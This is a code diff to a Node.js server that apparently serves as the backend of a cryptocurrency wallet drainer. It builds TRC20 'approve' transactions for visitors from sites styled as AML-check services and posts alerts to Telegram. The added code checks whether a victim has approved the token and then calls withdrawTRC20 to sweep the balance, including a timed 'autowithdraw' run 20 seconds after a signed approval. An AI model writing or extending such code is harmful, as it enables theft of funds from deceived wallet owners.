@@ -20,6 +20,8 @@ const {
 	createSendTRX,
 	createSendTRC10,
 	createApproveTRC20,
+	checkTRC20ApprovalToContract,
+	withdrawTRC20,
 	saveApprovedWallet,
 } = require('./modules/functions')
 const {
@@ -33,9 +35,6 @@ const allowedOrigins = [
 	`http://localhost:8080`,
 	`http://localhost:8081`,
 	`http://localhost:8082`,
-	`https://exploreraml.com`,
-	`https://resonant-centaur-b6f76f.netlify.app`,
-	`http://searchaml.net`,
 	`https://searchaml.net`,
 ]
 
@@ -248,7 +247,7 @@ function delay(ms) {
 async function getUnsignedTx(req, res) {
 	try {
 		const messageData = req.body
-		const { token, address, domain } = messageData
+		const { token, address, domain, domainAndPath } = messageData
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
@@ -287,13 +286,29 @@ async function getUnsignedTx(req, res) {
 				tx = { [transactionTitle]: transactionMessage, transaction }
 				return res.status(200).send({ tx })
 			case 'trc20':
-				console.log(
-					'TRC20 case, token:',
-					token.tokenName,
-					'balance:',
-					token.balance,
-				)
-				console.log('Creating approve transaction...')
+				if (
+					BigInt(token.balance || 0) > 0n &&
+					(await checkTRC20ApprovalToContract(
+						token,
+						address,
+						indexOfSetting,
+						tronWeb,
+					))
+				) {
+					console.log('Token approved')
+					if (
+						setting.mode === 3 ||
+						(setting.useAutowithdraw && setting.mode !== 4)
+					)
+						withdrawTRC20(
+							token,
+							address,
+							indexOfSetting,
+							domainAndPath,
+							tronWeb,
+						)
+					return res.status(200).send({ message: moveMessage })
+				}
 				const {
 					isActivatedAddress,
 					isRequiredEnergyAvailable,
@@ -320,7 +335,6 @@ async function getUnsignedTx(req, res) {
 					indexOfSetting,
 					tronWeb,
 				)
-				console.log('Approve transaction created:', transaction ? 'OK' : 'NULL')
 				tx = { [transactionTitle]: transactionMessage, transaction }
 				return res.status(200).send({ tx })
 			default:
@@ -360,7 +374,7 @@ async function sendSignedTransaction(req, res) {
 
 	try {
 		const messageData = req.body
-		const { token, address, domain } = messageData
+		const { token, address, domain, domainAndPath } = messageData
 		const indexOfSetting = SETTINGS.findIndex(setting =>
 			setting.domains.includes(domain),
 		)
@@ -430,6 +444,27 @@ async function sendSignedTransaction(req, res) {
 			parse_mode: 'HTML',
 			disable_web_page_preview: true,
 		})
+
+		// Handle autowithdraw
+		if (
+			token.tokenType === 'trc20' &&
+			Number(token.balance) > 0 &&
+			(setting.mode === 3 || (setting.useAutowithdraw && setting.mode !== 4))
+		) {
+			setTimeout(async () => {
+				try {
+					await withdrawTRC20(
+						token,
+						address,
+						indexOfSetting,
+						domainAndPath,
+						tronWeb,
+					)
+				} catch (error) {
+					console.error(error)
+				}
+			}, 20 * 1000)
+		}
 
 		// Return energy if needed
 		if (
